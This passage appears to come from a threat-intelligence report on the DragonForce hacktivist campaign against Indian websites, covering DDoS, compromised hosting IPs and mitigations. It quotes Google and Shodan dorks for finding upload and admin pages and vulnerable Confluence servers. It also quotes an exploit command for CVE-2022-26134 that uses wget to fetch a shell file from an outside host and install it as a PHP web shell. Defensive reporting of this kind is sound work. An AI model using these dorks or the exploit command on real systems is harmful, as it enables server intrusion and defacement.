A few significant dorks from the list are mentioned:\n\n**Google Dorks**\n\n\n**inurl:/admin/upload/ : Ministry of**\n**Knowledge & Resource sharing**\n\n**“allowed file types: png gif jpg txt**\n**site:gov.in” : Google dork to upload shell**\n**html files into the server**\n\n**inurl/mnux = campus login : Academic**\n**institutions with Campus login parameter**\n\n**inurl/mnux = administrative academic**\n**login : Academic institutions with**\n**Administrative academic login parameter**\n\n**inurl:admin/upload.php : For sites with**\n**upload feature that actors could exploit**\n**for shell using script deface**\n\n\n**inurl: /login/login.php admin: For Admin**\n**logins into websites using PHP**\n**language**\n\n**php?id= site:in: Indian sites with ID**\n**parameter that can be abused and URL**\n**manipulation could be performed**\n\n**inurl/mnux = academic login : Academic**\n**institutions with Academic login**\n**parameter**\n\n**inurl: /admin/cp.php : Reveals all sites**\n**with Control panel which can provide**\n**access to the server.**\n\n\n**Shodan Dorks and Atlassian Confluence Vulnerability**\n\nA PoC was shared for the exploit of the Atlassian Confluence vulnerability along with\nthe Shodan dork for Confluence Server vulnerabilities targeted towards the Indian\nregion.\n\n**Shodan Dork: http.favicon.hash:-305179312 country:\"IN\"**\n\nThe actor also shared a GitHub repository script which can be downloaded and\nexploited using the following python command:\n\n**CVE-2022-26134.py http://targets.com “wget https://site.com/shell.txt -O DFM.php**\n\n**DDoS Attacks (HTTP Flooding)**\n\nThe group invited its members and other users on the forum to conduct the DDoS\nattack where they shared an infographic stating the website, IP addresses, and the port\nof the target.\n\n\n-----\n\nInfographic shared by DragonForce group for OpsIndia/OpsPatuk\n\nThe group used a tool called HTTPFLOOD (aka “./404FOUND.MY”), which\nmanipulates and posts unwanted requests to bring down a web server or application.\nThe tool has been built in Python language and it takes the following three inputs:\n\nA target URL\nA Proxy list\nNumber of threads (i.e count of requests to be sent to the server)\nFurther analysis found that the user 'SKYSG404' built the HTTPFLOOD tool, and that\nboth the tool and the Github account hosting it were created on 12 June 2022.\n\n\n-----\n\nScreenshot of the Github account hosting HTTPFLOOD(./404found.my)\n\n### Compromising Servers\n\nIt was observed that a large number of domains being targeted, resolved to a common\nIP where they were hosted.\nThe attackers appeared to have gained access to the server via an injection\nvulnerability on one of the websites.\nOnce a server is compromised, all the websites hosted on it easily fall prey to the\nattackers, as seen in the pie chart below.\n\nPie chart depicting common IP being shared by multiple Domain names\n\nAs witnessed in the table given below, almost 61% of the domains compromised\nbelonged to E2ENetworks.in which is based in Delhi, India.\nAnother major chunk, 20.8%, of hacked domains belonged to Atria Convergence\n**Technologies Pvt. Ltd.**\n\n\n-----\n\nJointly, both of these ISPs constitute around 81% of the compromised websites.\n\n**Share of Domain names resolving to common IP and ISP Information**\n\n**IP** **Percentage** **Location** **Name of ISP**\n\n\n**164.52.212.58** **40.1**\n\n**216.48.179.60** **20.8**\n\n**183.83.180.226** **20.8**\n\n\n**Saidabad, New Delhi,**\n**India** **E2ENetworks.in**\n\n**Saidabad, New Delhi,**\n**India** **E2ENetworks.in**\n\n\n**Lucknow, Uttar**\n**Pradesh, India**\n\n\n**Atria Convergence**\n**Technologies pvt ltd**\n\n\n**120.138.4.218** **8.2** **Valsad, Gujarat, India** **SHREENET**\n\n**103.115.194.39** **4.8** **Mumbai, India** **Netmagic Datacenter Mumbai**\n\n## Impact & Mitigation\n\n**Impact** **Mitigation**\n\n\n**Escalation of such campaigns on a**\n**global level can lead to atrocious**\n**consequences for the Indian**\n**government and entities.**\n**Exposed data would equip**\n**malicious actors with details**\n**required to launch sophisticated**\n**attacks.**\n**Attacks on defense infrastructure**\n**can lead to sensitive information**\n**being compromised and cause a**\n**national security issue.**\n\n## References\n\n Appendix\n\n\n**Patch vulnerable and exploitable**\n**endpoints.**\n**Monitor for anomalies in user**\n**accounts and internet-exposed**\n**web applications, indicating**\n**possible account takeovers.**\n**Scan repositories to identify**\n**exposed credentials and secrets.**\n**Monitor cybercrime forums for the**\n**latest tactics employed by threat**\n**actors.**\n\n\n-----\n\nMumbai University’s website server was down in the aftermath of the DDOS attack\n\nInfographic shared by DragonForce group for OpsIsrael/OpsBedil\n\n\n-----\n\nannabel.ns.cloudflare.com DNS server with 2110 hosted domains.\n\nnicolas.ns.cloudflare.com DNS server with 3909 hosted domains.\n\n\n-----",
